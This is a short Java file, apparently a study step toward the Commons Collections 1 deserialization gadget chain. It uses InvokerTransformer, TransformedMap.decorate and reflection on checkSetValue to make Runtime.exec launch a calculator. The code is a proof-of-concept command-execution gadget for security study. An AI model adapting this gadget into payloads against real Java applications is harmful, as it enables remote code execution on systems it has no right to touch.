package cc1.ser;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.reflect.Method;
import java.util.HashMap;

public class decorateChain {
    public static void main(String[] args) throws Exception {
    /*
        input = Runtime
        iMethodName = exec
        iParamTypes = String.class
        iArgs = "/usr/bin/gnome-calculator"
    */

        /*
protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    super(map);
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;
}
         */

        /*
        valueTransformer = invokerTransformer
         */
        String cmd = "/usr/bin/gnome-calculator";
        InvokerTransformer invokerTransformer = new InvokerTransformer(
                "exec",
                new Class[]{String.class},
                new Object[]{cmd}
        );
        Runtime input = Runtime.getRuntime();
        HashMap<Object,Object> hashMap =new HashMap<>();
        TransformedMap decoratedMap = (TransformedMap) TransformedMap.decorate(
                hashMap,null, invokerTransformer
        );
        // reflect to use checkSetValue
        Class<TransformedMap> clazz = TransformedMap.class;
        Method method = clazz.getDeclaredMethod("checkSetValue", Object.class);
        //         invokerTransformer.transform(input);
        method.setAccessible(true);
        method.invoke(decoratedMap, input);

    }
}
